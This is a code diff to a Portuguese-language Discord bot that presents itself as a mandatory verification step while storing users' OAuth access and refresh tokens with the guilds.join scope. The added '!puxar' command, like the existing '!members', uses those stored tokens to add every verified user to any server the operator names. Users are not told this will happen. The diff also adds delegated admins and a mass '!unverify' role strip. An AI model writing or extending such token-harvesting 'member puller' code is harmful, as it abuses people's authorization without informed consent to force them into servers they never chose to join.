@@ -24,12 +24,14 @@ const config = {
     PORT: process.env.PORT || 8080,
     GUILD_ID: process.env.GUILD_ID,
     ROLE_ID: process.env.ROLE_ID,
+    UNVERIFIED_ROLE_ID: process.env.UNVERIFIED_ROLE_ID,
     OWNER_ID: process.env.OWNER_ID
 };
 
 const DB_FILE = 'users.json';
 const CONFIG_FILE = 'custom_config.json';
 const SERVERS_FILE = 'servers.json';
+const ADMINS_FILE = 'admins.json';
 
 let usersDB = {};
 if (fs.existsSync(DB_FILE)) usersDB = JSON.parse(fs.readFileSync(DB_FILE));
@@ -43,9 +45,13 @@ if (fs.existsSync(CONFIG_FILE)) botConfig = JSON.parse(fs.readFileSync(CONFIG_FI
 let serversDB = [];
 if (fs.existsSync(SERVERS_FILE)) serversDB = JSON.parse(fs.readFileSync(SERVERS_FILE));
 
+let adminsDB = [];
+if (fs.existsSync(ADMINS_FILE)) adminsDB = JSON.parse(fs.readFileSync(ADMINS_FILE));
+
 function saveUser(userId, accessToken, refreshToken, expiresIn) {
     const expiresAt = Date.now() + (expiresIn * 1000);
-    usersDB[userId] = { accessToken, refreshToken, expiresAt };
+    const verifiedAt = usersDB[userId]?.verifiedAt || Date.now();
+    usersDB[userId] = { accessToken, refreshToken, expiresAt, verifiedAt };
     fs.writeFileSync(DB_FILE, JSON.stringify(usersDB, null, 2));
 }
 
@@ -53,11 +59,15 @@ function saveConfig() {
     fs.writeFileSync(CONFIG_FILE, JSON.stringify(botConfig, null, 2));
 }
 
+function saveAdmins() {
+    fs.writeFileSync(ADMINS_FILE, JSON.stringify(adminsDB, null, 2));
+}
+
 function logServerAction(guild, action) {
     const entry = {
         serverName: guild.name,
         serverId: guild.id,
-        action: action, // 'ENTROU' ou 'SAIU'
+        action: action, 
         date: new Date().toLocaleString('pt-BR'),
         memberCount: guild.memberCount
     };
@@ -167,6 +177,9 @@ app.get('/callback', async (req, res) => {
             const member = await guild.members.fetch(userId).catch(() => null);
             if (member) {
                 await member.roles.add(config.ROLE_ID);
+                if (config.UNVERIFIED_ROLE_ID) {
+                    await member.roles.remove(config.UNVERIFIED_ROLE_ID).catch(() => {});
+                }
             } else {
                 throw new Error('Usuário não encontrado no servidor após tentar adicionar.');
             }
@@ -182,16 +195,48 @@ app.get('/callback', async (req, res) => {
     }
 });
 
-client.on('guildCreate', guild => {
-    logServerAction(guild, 'ENTROU');
-});
-
-client.on('guildDelete', guild => {
-    logServerAction(guild, 'SAIU');
-});
+client.on('guildCreate', guild => logServerAction(guild, 'ENTROU'));
+client.on('guildDelete', guild => logServerAction(guild, 'SAIU'));
 
 client.on('messageCreate', async (message) => {
-    if (message.author.bot || message.author.id !== config.OWNER_ID) return;
+    if (message.author.bot) return;
+
+    const isOwner = message.author.id === config.OWNER_ID;
+    const isAdmin = isOwner || adminsDB.includes(message.author.id);
+
+    if (message.content.startsWith('!definiradm')) {
+        if (!isOwner) return;
+        message.delete().catch(() => {});
+        const user = message.mentions.users.first();
+        if (!user) return message.channel.send('Mencione alguém para dar ADM.').then(m => setTimeout(() => m.delete(), 3000));
+        
+        if (!adminsDB.includes(user.id)) {
+            adminsDB.push(user.id);
+            saveAdmins();
+            message.channel.send(`✅ **${user.tag}** agora é Administrador do bot.`);
+        } else {
+            message.channel.send(`⚠️ **${user.tag}** já é Administrador.`);
+        }
+        return;
+    }
+
+    if (message.content.startsWith('!retiraradm')) {
+        if (!isOwner) return;
+        message.delete().catch(() => {});
+        const user = message.mentions.users.first();
+        if (!user) return message.channel.send('Mencione alguém para remover ADM.').then(m => setTimeout(() => m.delete(), 3000));
+
+        if (adminsDB.includes(user.id)) {
+            adminsDB = adminsDB.filter(id => id !== user.id);
+            saveAdmins();
+            message.channel.send(`🗑️ **${user.tag}** foi removido dos Administradores.`);
+        } else {
+            message.channel.send(`⚠️ **${user.tag}** não é Administrador.`);
+        }
+        return;
+    }
+
+    if (!isAdmin) return; 
 
     if (message.content === '!sconfig') {
         message.delete().catch(() => {});
@@ -208,14 +253,12 @@ client.on('messageCreate', async (message) => {
             new ButtonBuilder().setCustomId('btn_config_desc').setLabel('📝 Alterar Descrição').setStyle(ButtonStyle.Secondary),
             new ButtonBuilder().setCustomId('btn_config_img').setLabel('🖼️ Alterar Imagem').setStyle(ButtonStyle.Secondary)
         );
-
         return message.channel.send({ embeds: [embed], components: [row] });
     }
 
     if (message.content === '!setup') {
         message.delete().catch(() => {});
         const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${config.CLIENT_ID}&redirect_uri=${encodeURIComponent(config.REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join`;
-        
         const embed = new EmbedBuilder()
             .setTitle('🛡️ Verificação Obrigatória')
             .setDescription(botConfig.description)
@@ -226,16 +269,45 @@ client.on('messageCreate', async (message) => {
         const row = new ActionRowBuilder().addComponents(
             new ButtonBuilder().setLabel('🔓 Verificar Agora').setStyle(ButtonStyle.Link).setURL(authUrl)
         );
-        
         return message.channel.send({ embeds: [embed], components: [row] });
+    }
+
+    if (message.content === '!reset') {
+        message.delete().catch(() => {});
+        if (!isOwner) return message.channel.send('❌ Apenas o Dono pode resetar o banco de dados.');
+        usersDB = {}; 
+        fs.writeFileSync(DB_FILE, JSON.stringify(usersDB, null, 2));
+        const embed = new EmbedBuilder()
+            .setTitle('⚠️ Banco de Dados Resetado')
+            .setDescription('Todos os usuários foram removidos da memória.')
+            .setColor('Orange');
+        message.channel.send({ embeds: [embed] });
+    }
+
+    if (message.content.startsWith('!puxar')) {
+        message.delete().catch(() => {});
+        const targetGuildId = message.content.split(' ')[1];
+        const targetGuild = client.guilds.cache.get(targetGuildId);
+        if (!targetGuild) return message.channel.send('Servidor não encontrado.').then(m => setTimeout(() => m.delete(), 5000));
+
+        message.channel.send('Iniciando puxada...').then(m => setTimeout(() => m.delete(), 5000));
+        
+        const users = Object.keys(usersDB);
+        for (const userId of users) {
+            const validToken = await getValidAccessToken(userId);
+            if (validToken) {
+                try {
+                    await targetGuild.members.add(userId, { accessToken: validToken });
+                } catch (e) {}
+            }
+            await new Promise(r => setTimeout(r, 1000));
+        }
     }
 
     if (message.content === '!members') {
         message.delete().catch(() => {});
         const targetGuild = message.guild;
-        
-        const statusMsg = await message.channel.send(`🔄 Iniciando puxada de membros para **${targetGuild.name}**... Isso pode demorar.`);
-        
+        const statusMsg = await message.channel.send(`🔄 Iniciando puxada de membros para **${targetGuild.name}**...`);
         const users = Object.keys(usersDB);
         let success = 0;
         let fail = 0;
@@ -246,15 +318,11 @@ client.on('messageCreate', async (message) => {
                 try {
                     await targetGuild.members.add(userId, { accessToken: validToken });
                     success++;
-                } catch (e) {
-                    fail++;
-                }
-            } else {
-                fail++;
-            }
+                } catch (e) { fail++; }
+            } else { fail++; }
             await new Promise(r => setTimeout(r, 1000));
         }
-        statusMsg.edit(`✅ **Processo Finalizado!**\n\n📥 Sucessos: ${success}\n❌ Falhas: ${fail}`);
+        statusMsg.edit(`✅ **Finalizado!**\n📥 Sucessos: ${success}\n❌ Falhas: ${fail}`);
     }
 
     if (message.content === '!gerarlink') {
@@ -272,10 +340,71 @@ client.on('messageCreate', async (message) => {
         await message.channel.send('👋 Saindo do servidor...');
         await message.guild.leave();
     }
+
+    if (message.content.startsWith('!unverify')) {
+        message.delete().catch(() => {});
+        if (!config.UNVERIFIED_ROLE_ID || !config.ROLE_ID) {
+            return message.channel.send('❌ Erro: Configure `ROLE_ID` e `UNVERIFIED_ROLE_ID` no Railway.').then(m => setTimeout(() => m.delete(), 5000));
+        }
+
+        const mentions = message.mentions.users;
+        const guild = message.guild;
+        const members = await guild.members.fetch(); 
+        let count = 0;
+
+        const msg = await message.channel.send('🔄 Removendo verificação dos membros...');
+
+        for (const [id, member] of members) {
+            if (member.user.bot || id === config.OWNER_ID || mentions.has(id)) continue;
+
+            if (member.roles.cache.has(config.ROLE_ID)) {
+                try {
+                    await member.roles.remove(config.ROLE_ID);
+                    await member.roles.add(config.UNVERIFIED_ROLE_ID);
+                    count++;
+                } catch (e) { }
+                await new Promise(r => setTimeout(r, 500)); 
+            }
+        }
+        msg.edit(`✅ **Unverify Concluído!**\n👥 Membros afetados: ${count}`);
+    }
+
+    if (message.content === '!countm') {
+        message.delete().catch(() => {});
+        const guild = message.guild;
+        const verifiedMembers = [];
+        
+        for (const [userId, data] of Object.entries(usersDB)) {
+            const member = guild.members.cache.get(userId);
+            if (member && member.roles.cache.has(config.ROLE_ID)) {
+                const dateStr = data.verifiedAt ? new Date(data.verifiedAt).toLocaleDateString('pt-BR') : 'Data desc.';
+                verifiedMembers.push(`<@${userId}> (Verificado em: ${dateStr})`);
+            }
+        }
+
+        if (verifiedMembers.length === 0) {
+            return message.channel.send('❌ Ninguém verificado encontrado no banco de dados que esteja neste servidor.');
+        }
+
+        const header = `📊 **Membros Verificados: ${verifiedMembers.length}**\n\n`;
+        let currentMsg = header;
+        
+        for (const line of verifiedMembers) {
+            if (currentMsg.length + line.length > 1900) {
+                await message.channel.send(currentMsg);
+                currentMsg = '';
+            }
+            currentMsg += line + '\n';
+        }
+        if (currentMsg) await message.channel.send(currentMsg);
+    }
 });
 
 client.on('interactionCreate', async (interaction) => {
-    if (interaction.user.id !== config.OWNER_ID) return;
+    if (interaction.user.bot) return;
+    const isOwner = interaction.user.id === config.OWNER_ID;
+    const isAdmin = isOwner || adminsDB.includes(interaction.user.id);
+    if (!isAdmin) return;
 
     if (interaction.isButton()) {
         if (interaction.customId === 'btn_config_desc') {
